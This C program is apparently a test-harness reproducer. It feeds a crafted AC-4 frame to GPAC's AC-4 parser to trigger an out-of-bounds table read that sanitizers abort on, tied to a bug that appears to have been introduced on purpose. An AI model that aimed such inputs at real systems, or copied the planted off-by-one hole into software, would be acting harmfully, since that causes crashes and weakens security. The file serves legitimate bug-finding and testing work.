/*
 * Proof-of-concept for a delocalized out-of-bounds read (CWE-125) in GPAC's
 * AC-4 bitstream parser, reached through the public library API.
 *
 * Public entry point:  gf_ac4_parser_bs()   (include/gpac/avparse.h)
 * In-contract input:   a single raw AC-4 TOC frame (sync word 0xAC40 + frame
 *                      size + table-of-contents), the exact byte stream the
 *                      parser is contracted to accept.
 *
 * The frame below describes one presentation carrying one substream group with
 * a single object-based substream whose n_objects_code = 5.  Parsing that
 * substream makes gf_ac4_substream_info_obj() evaluate
 *     N_OBJECTS_CODE_TO_NUM_OBJECTS[n_objects_code]
 * The reserved-code guard admits n_objects_code == 5, but the lookup table only
 * has 5 entries (indices 0..4) on the resulting tree, so the read at index 5 is
 * out of bounds and AddressSanitizer/UBSan aborts.
 *
 * On the unmodified batch (and on either single edited commit alone) the table
 * still has its 6th entry, so index 5 is in bounds and the program exits 0.
 */
#include <gpac/tools.h>
#include <gpac/bitstream.h>
#include <gpac/avparse.h>
#include <gpac/mpeg4_odf.h>

/* Make any sanitizer finding abort (SIGABRT) rather than exit(1), independent
 * of the harness environment.  This only affects how a detected fault is
 * reported - it never suppresses detection. */
const char *__asan_default_options(void) { return "abort_on_error=1"; }
const char *__ubsan_default_options(void) { return "abort_on_error=1:halt_on_error=1"; }

int main(void)
{
	static const unsigned char ac4_frame[] = {
		0xac, 0x40, 0x00, 0x20, 0x80, 0x04, 0x12, 0x00,
		0x00, 0x00, 0x11, 0x60, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00
	};

	GF_AC4Config cfg;
	GF_BitStream *bs;

	memset(&cfg, 0, sizeof(cfg));
	bs = gf_bs_new((const u8 *) ac4_frame, (u32) sizeof(ac4_frame), GF_BITSTREAM_READ);
	if (!bs) return 1;

	/* full_parse = GF_TRUE drives the deep TOC parse; start_from_toc = GF_FALSE
	   so the sync word + frame size header is consumed first. */
	gf_ac4_parser_bs(bs, &cfg, GF_TRUE, GF_FALSE);

	gf_bs_del(bs);
	gf_odf_ac4_cfg_clean_list(&cfg);
	return 0;
}
